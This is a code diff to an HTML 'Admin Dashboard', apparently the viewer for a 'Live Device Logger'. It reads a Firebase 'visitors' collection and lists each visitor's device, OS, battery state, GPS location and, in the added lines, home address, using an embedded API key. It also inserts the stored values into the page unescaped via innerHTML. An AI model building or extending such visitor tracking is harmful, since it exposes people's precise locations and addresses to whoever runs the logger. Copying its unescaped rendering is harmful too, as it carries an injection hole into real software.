@@ -5,9 +5,8 @@
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-import { getFirestore, collection, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-// Firebase Config
 const firebaseConfig = {
   apiKey: "AIzaSyCsGBSRCHVUhXQZ5DNMEZWgQWk1gxMF1E4",
   authDomain: "signup-d32c5.firebaseapp.com",
@@ -18,34 +17,22 @@ const firebaseConfig = {
   measurementId: "G-VLC3QHK8CG"
 };
 
-// Init Firebase
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
 async function loadData() {
-  const qData = query(collection(db, "visitors"), orderBy("time", "desc"));
-  const q = await getDocs(qData);
-
+  const q = await getDocs(collection(db, "visitors"));
   q.forEach(docSnap => {
     let d = docSnap.data();
-
     document.getElementById("log").innerHTML += `
-      <div style="margin:8px;padding:10px;border:1px solid #ccc;border-radius:8px;background:#f9f9f9">
-        📱 <b>Device:</b> ${d.deviceModel || "Unknown"}<br>
-        💻 <b>OS:</b> ${d.os || "N/A"}<br>
-        🌐 <b>User Agent:</b> <small>${d.userAgent}</small><br><br>
-
-        🔋 <b>Battery:</b> ${d.battery || "?"}  
-        ⚡ <b>Charging:</b> ${d.charging ? "Yes" : "No"}<br><br>
-
-        📍 <b>Location:</b> ${d.location || "Not Allowed"}<br><br>
-
-        ⏰ <b>First Visit:</b> ${
-          d.time?.toDate ? d.time.toDate().toLocaleString() : d.time
-        }<br>
-        🕒 <b>Last Update:</b> ${
-          d.lastUpdate?.toDate ? d.lastUpdate.toDate().toLocaleString() : d.lastUpdate || "N/A"
-        }
+      <div style="margin:6px;padding:8px;border:1px solid #ccc;border-radius:6px">
+        📱 <b>Device:</b> ${d.device}<br>
+        🌍 <b>OS:</b> ${d.os}<br>
+        🔌 <b>Battery:</b> ${d.battery} (Charging: ${d.charging})<br>
+        📍 <b>GPS:</b> ${d.location}<br>
+        🏠 <b>Address:</b> ${d.address}<br>
+        ⏱️ <b>Time:</b> ${d.time?.toDate ? d.time.toDate() : d.time}<br>
+        🕒 Last Update: ${d.lastUpdate || "N/A"}
       </div>
     `;
   });
@@ -53,14 +40,10 @@ async function loadData() {
 
 window.onload = loadData;
 </script>
-
 </head>
-<body style="font-family:Arial;padding:20px;">
-<h2>Admin Dashboard ⚡</h2>
-<p>Live Device Logger</p>
-<hr>
 
+<body style="font-family:Arial;">
+<h2>🔥 Admin Dashboard</h2>
 <div id="log"></div>
-
 </body>
 </html>
